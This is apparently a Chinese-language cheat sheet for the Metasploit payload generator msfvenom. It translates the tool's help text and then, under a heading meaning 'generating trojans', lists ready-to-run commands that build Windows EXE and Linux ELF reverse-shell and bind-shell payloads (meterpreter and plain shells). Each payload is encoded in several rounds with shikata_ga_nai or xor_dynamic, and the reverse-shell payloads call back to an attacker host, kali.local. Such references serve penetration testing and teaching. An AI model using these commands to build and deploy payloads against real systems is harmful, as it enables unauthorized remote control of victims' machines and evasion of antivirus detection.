## 1 帮助

查看帮助

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -h
```

```
MsfVenom 是一个 Metasploit 独立的 payload 生成器
也可替代 msfpayload 和 msfencode
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
```

```
Options:
    -l, --list            <type>     列出 [type] 的所有模块。类型有：payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  要使用的 payload （--list payload 列出 payload ，--list-options 列出 options ）。指定 '-' 或 STDIN 以自定义
        --list-options               列出 --payload <value> 的标准、高级和规避选项
    -f, --format          <format>   输出格式（使用 --list formats 来列出）
    -e, --encoder         <encoder>  要使用的编码器（使用 --list encoders 来列出）
        --service-name    <value>    生成服务二进制文件时使用的服务名称
        --sec-name        <value>    生成大型 Windows 二进制文件时使用的新部分名称。默认：随机 4 字符字母字符串
        --smallest                   使用所有可用编码器生成尽可能小的 payload 
        --encrypt         <value>    应用于 shellcode 的加密或编码类型（使用 --list encrypt 来列出）
        --encrypt-key     <value>    用于 --encrypt 的密钥
        --encrypt-iv      <value>    用于 --encrypt 的初始化向量
    -a, --arch            <arch>     用于 --payload 和 --encoders 的架构（使用 --list archs 来列出）
        --platform        <platform> 用于 --payload 的平台（使用 --list platforms 来列出）
    -o, --out             <path>     将 payload 保存到文件中
    -b, --bad-chars       <list>     应避免使用的字符 例如："\x00\xff
    -n, --nopsled         <length>   在 payload 前添加 [length] 大小的 nopsled
        --pad-nops                   使用 -n <length> 指定的 nopsled 大小作为总有效载荷大小，自动准备一个数量为 -n <length> 的 nopsled (nops 减去 payload 长度)
    -s, --space           <length>   生成的 payload 的最大大小
        --encoder-space   <length>   编码 payload 的最大大小（默认为 -s 值）
    -i, --iterations      <count>    对 payload 进行编码的次数
    -c, --add-code        <path>     指定要包含的附加 win32 shellcode 文件
    -x, --template        <path>     指定用作模板的自定义可执行文件
    -k, --keep                       保留 --template 行为，并将 payload 作为新线程注入
    -v, --var-name        <value>    指定用于某些输出格式的自定义变量名
    -t, --timeout         <second>   从 STDIN 读取 payload 时等待的秒数（默认为 30，0 表示禁用）
    -h, --help                       显示此信息
```

查找 meterpreter payload

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -l payloads | grep meterpreter
```

## 2 生成木马

**windows**

使用 msfvenom 生成 反弹 shell 的 exe_x86 文件

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
```

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
```

使用 msfvenom 生成 反弹 shell 的 exe_x64 文件

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
```

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
```

使用 msfvenom 生成 正向连接的 exe_x86 文件

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
```

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /root/shell.exe
```

使用 msfvenom 生成 正向连接的 exe_x64 文件

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_tcp RHOST=win.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
```

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp RHOST=win.loacl LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f exe -o /root/shell.exe
```

**linux**

使用 msfvenom 生成 反弹 shell 的 elf_x86 文件

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
```

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
```

使用 msfvenom 生成 反弹 shell 的 elf_x64 文件

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
```

```shell
┌──(root㉿kali)-[~]
└─# msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=kali.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
```

使用 msfvenom 生成 正向连接的 elf_x86 文件

```shell
┌──(root㉿a-kali-23)-[~]
└─# msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
```

```shell
┌──(root㉿a-kali-23)-[~]
└─# msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f elf -o /root/shell.elf
```

使用 msfvenom 生成 正向连接的 elf_x64 文件

```shell
┌──(root㉿a-kali-23)-[~]
└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
```

```shell
┌──(root㉿a-kali-23)-[~]
└─# msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp RHOST=centos.local LPORT=4444 -b "\x00" -e x64/xor_dynamic -i 10 -f elf -o /root/shell.elf
```

---

参考链接

- [msfvenom](https://www.kali.org/tools/metasploit-framework/#msfvenom)
